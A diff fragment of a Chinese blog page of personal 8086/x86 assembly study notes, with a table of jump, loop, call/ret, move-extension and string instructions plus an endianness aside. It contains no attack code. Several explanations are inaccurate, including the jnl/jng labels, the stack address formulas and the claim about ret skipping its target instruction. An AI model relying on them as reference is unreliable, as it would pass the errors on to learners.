ax,100H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov bx,50H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;cmp ax,ax</div><div>&nbsp;&nbsp;&nbsp;&nbsp;je @test ;等於則跳轉到test標準</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jmp</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>無條件跳轉</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,100H</div><div>mov word ptr bx,ax</div><div>jmp @test</div><div>mov cx,04H</div><div>@test: mov ax,0H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jz</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>為0則跳轉</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,0H</div><div>cmp ax,ax</div><div>jz @test</div><div>mov bx,6C43H</div><div>@test: mov ax,6644H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jg</div><div>jng #無無符號數字判斷</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">有符號大於則跳轉</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>&nbsp;&nbsp;&nbsp;&nbsp;mov ax,400H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov bx,200H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;cmp ax,bx</div><div>&nbsp;&nbsp;&nbsp;&nbsp;jg @test</div><div>&nbsp;&nbsp;&nbsp;&nbsp;xor ax,ax</div><div>@test:mov bx,600H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jl</div><div>jnl #無符號小於則跳轉</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>有符號小於的則跳轉</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>&nbsp; &nbsp; mov ax,400H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov bx,200H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;cmp bx,ax</div><div>&nbsp;&nbsp;&nbsp;&nbsp;jl @test</div><div>&nbsp;&nbsp;&nbsp;&nbsp;xor ax,ax</div><div>@test:mov bx,600H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>loop</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>循环，cx存放循环次数</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,3</div><div>mov cx,2 ;循环两次</div><div>s:add ax,ax</div><div>loop s</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>ret</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>用栈中所保存的数据赋值给IP的，(CS:IP)jump 跳转回来（注意：跳转到指定的地址后，跳转后地址的那条指令是不会执行的）</div><div><img src="汇编指令_files/Image [2].png" type="image/png" data-filename="Image.png"></div><div><br></div><div>IP = ss<em>10(16进制的10) + sp （保存的值出栈， 复制给IP）</em></div><div>sp = sp +2</div><div><br></div><div>这写shellcode的时候，找到函数地址用于返回函数地址</div><div><br></div><div>比如栈顶最上面有12345678h的值，那么ret之后。就是把12345678h pop到IP，在x86为EIP</div><div><br></div><div>堆栈</div><div>12345678h</div><div><br></div><div>ret前</div><div>EAX&nbsp;=&nbsp;12345678 EBX&nbsp;=&nbsp;7EFDE000 ECX&nbsp;=&nbsp;00000000 EDX&nbsp;=&nbsp;00F21005 ESI&nbsp;=&nbsp;00000000 EDI&nbsp;=&nbsp;00000000 EIP&nbsp;=&nbsp;00F21018 ESP&nbsp;=&nbsp;002AFC90 EBP&nbsp;=&nbsp;002AFC94 EFL&nbsp;=&nbsp;00000244</div><div><br></div><div>ret后</div><div>EAX&nbsp;=&nbsp;12345678 EBX&nbsp;=&nbsp;7EFDE000 ECX&nbsp;=&nbsp;00000000 EDX&nbsp;=&nbsp;00F21005 ESI&nbsp;=&nbsp;00000000 EDI&nbsp;=&nbsp;00000000 EIP&nbsp;=&nbsp;12345678 ESP&nbsp;=&nbsp;002AFC94 EBP&nbsp;=&nbsp;002AFC94 EFL&nbsp;=&nbsp;00010244</div><div><br></div><div>堆栈</div><div>&lt;空&gt;</div><div><br></div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>假设栈顶最后4个字节（8086汇编）将赋给IP，跳转到对应的物理地址往下执行</div><div><img src="汇编指令_files/Image [3].png" type="image/png" data-filename="Image.png"></div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,264CH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV BX,3682H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;PUSH AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;PUSH BX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV CX,2</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,SS</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV DS,AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV BX,SP</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,DS:[BX]</div><div>XH: ADD AX,AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;LOOP XH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;POP BX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;POP DX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;PUSH AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;XOR AX,AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;RET</div><div><br></div><div><img src="汇编指令_files/Image [4].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>call</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>将当前的IP 或者 CS:IP 压入栈中，跳转到指定位置</div><div><br></div><div>简单描述：</div><div>sp = sp -2</div><div>ss 10(16进制) + sp = ip （将IP的值压栈）</div><div>IP = IP +16位位移&nbsp;&nbsp;（就是jmp了）</div><div><img src="汇编指令_files/Image [5].png" type="image/png" data-filename="Image.png"></div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>&nbsp; MOV AX,264CH</div><div>&nbsp; CALL FAN</div><div>&nbsp; &nbsp;MOV BX,142CH</div><div>FAN: MOV AH,4CH</div><div>&nbsp; &nbsp;INT 21H</div><div><br></div><div>搭配RET一起使用：</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,264CH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CALL FAN</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MOV BX,248CH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JMP T</div><div>&nbsp;&nbsp;&nbsp;&nbsp;;此处输入代码段代码</div><div>FAN: MOV AH,4CH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,0006H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;PUSH AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;RET ;跳回到MOV BX执行</div><div>T:&nbsp;&nbsp;INT 21H</div><div><img src="汇编指令_files/save.png" type="image/png" data-filename="save.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>movsx</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>符号扩展的意思是,当计算机存储某一个有符号数时,符号位位于该数的第一位,所以，当扩展一个负数的时候需要将扩展的高位全赋为1.对于正数而言，符号扩展和零扩展MOVZX是一样的，将扩展的高位全赋为0</div><div>(X86汇编或以上才有)</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>&nbsp;&nbsp;例子:MOV BL,80H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MOVSX AX,BL</div><div>&nbsp;&nbsp;&nbsp;AX == 0FF80H</div><div>&nbsp;&nbsp;&nbsp;可能初学者奇怪80H不是正数吗?FF怎么来的?看下面，</div><div>&nbsp;&nbsp;&nbsp;80h = 1000 0000 最高位为符号位, 即符号位为1</div><div>&nbsp;&nbsp;&nbsp;则MOVSX AX, BL后, AX = 1111 1111 1000 0000 = FF80h</div><div><img src="汇编指令_files/Image [6].png" type="image/png" data-filename="Image.png"></div><div><br></div><div><img src="汇编指令_files/Image [7].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>movzx</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>movzx是把高位全部用0填充，被进行赋值操作的寄存器会把得到的值放在地位寄存器，然后高位寄存器全0补充</div><div><br></div><div>(X86汇编或以上才有)</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov BX, 12C5H</div><div>movzx EAX,BX</div><div><br></div><div><img src="汇编指令_files/Image [8].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>pusha</div><div>pushad</div><div>popa</div><div>popad</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>pusha/pushad两条指令都是将通用寄存器进行入栈</div><div>popa/popad两条指令都是将栈段内的数据全部出栈到通用寄存器</div><div>参考链接：<a href="https://blog.csdn.net/u013490896/article/details/50866801?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/u013490896/article/details/50866801?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div><img src="汇编指令_files/Image [9].png" type="image/png" data-filename="Image.png"></div><div><img src="汇编指令_files/Image [10].png" type="image/png" data-filename="Image.png"></div><div><img src="汇编指令_files/Image [11].png" type="image/png" data-filename="Image.png"><img src="汇编指令_files/Image [12].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>bswap</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>寄存器高位和地位数据字节次序变反</div><div>Example：</div><div>EAX=12345678H</div><div>变反后：</div><div>78563412H</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div><img src="汇编指令_files/Image [13].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>lea</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>（x86汇编或以上才有） load effective address, 加载有效地址，可以将有效地址传送到指定的的寄存器。指令形式是从存储器读数据到寄存器, 效果是将存储器的有效地址写入到目的操作数, 简单说, 就是C语言中的”&amp;”.（把DS:[寄存器]地址所指向的值基于给某给寄存器）</div><div><br></div><div>lea对变量没有影响是取地址,对寄存器来说加[]时取值,第二操作数不加[]非法</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov eax,0x4C2</div><div>lea ebx,dword ptr DS:[EAX] ;将EAX的地址给ebx</div><div><img src="汇编指令_files/Image [14].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>LODSD</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>LODSB、LODSW 和 LODSD 指令分别从 ESI 指向的内存地址加载一个字节或一个字到 AL/AX/EAX。ESI 按照方向标志位的状态递增或递减。</div><div><br></div><div>LODS 很少与 REP 前缀一起使用，原因是，加载到累加器的新值会覆盖其原来的内容。相对而言，LODS常常被用于加载单个 数值。在后面的例子中，LODSB代替了如下两条指令（假设方向标志位清零）：</div><div>mov al, ［esi］&nbsp;&nbsp;&nbsp; ;将字节送入AL</div><div>inc esi&nbsp;&nbsp;&nbsp; ;指向下一个字节</div><div><br></div><div>默认将DS:[esi]地址所指向的值赋予EAX</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div><img src="汇编指令_files/Image [15].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>xchg</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>两个寄存器的值互相交换</div><div>xchg &lt;被交换的寄存器&gt;,&lt;要交换的寄存器&gt;</div><div>例如：xchg eax,esi</div><div>EAX=ESI的值</div><div>ESI=EAX的值</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>执行前：</div><div><img src="汇编指令_files/Image [16].png" type="image/png" data-filename="Image.png"></div><div><br></div><div>执行xchg指令后：</div><div><img src="汇编指令_files/Image [17].png" type="image/png" data-filename="Image.png"></div><div><br></div><div><br></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>test</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>对两个寄存器进行逻辑计算，根据返回的结果修改标志位,自己测试的时候是如果寄存器其中一方为0，Z、P标准位设置位1，否则Z、P标准位设置为0。下面是文章说的</div><div><br></div><div>( 影响标志: C,O,P,Z,S(其中C与O两个标志会被设为0))</div><div><br></div><div>该指令主要用来判断其中一方的寄存器是否为0</div><div><br></div><div>顺便说一下标志位，所有标志位在念的时候都加一个F，比如：Z=ZF标准位，C=CF标志位</div><div><br></div><div><br></div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>其中一方寄存器为0</div><div><img src="汇编指令_files/20200809171409.png" type="image/png" data-filename="20200809171409.png" width="348"></div><div><br></div><div>两边的寄存器都不为0</div><div><img src="汇编指令_files/20200809171045.png" type="image/png" data-filename="20200809171045.png"></div></td></tr></tbody></table>
+
+
+<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>内存读写的大小端<br>主流的汇编架构，内存里都是小端<br>例如：mov ax,4C3B -&gt; 内存里：3B4C<br><img src="https://s1.ax1x.com/2020/09/21/wqd9gO.png" alt=""></p>
+<p>大端：mov ax,4C3B -&gt; 内存里：4C3B</p>
+<p>大端只有在很少见的IOT设备可能有</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1556,12 +1739,12 @@ z0 中存放着执行命令，列目录，修改文件等操作的PHP代码,并�
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Bypass菜刀进化成过Waf刀</p>
+    <p><span class="copy-title">文章标题:</span>汇编学习总结</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-08-21, 15:18:03</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/ec776b6d.html" title="Bypass菜刀进化成过Waf刀">http://422926799.github.io/posts/ec776b6d.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-09-21, 19:20:18</p>
+    <p><span class="copy-title">最后更新:</span>2020-09-21, 23:22:34</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/7a38fa87.html" title="汇编学习总结">http://422926799.github.io/posts/7a38fa87.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
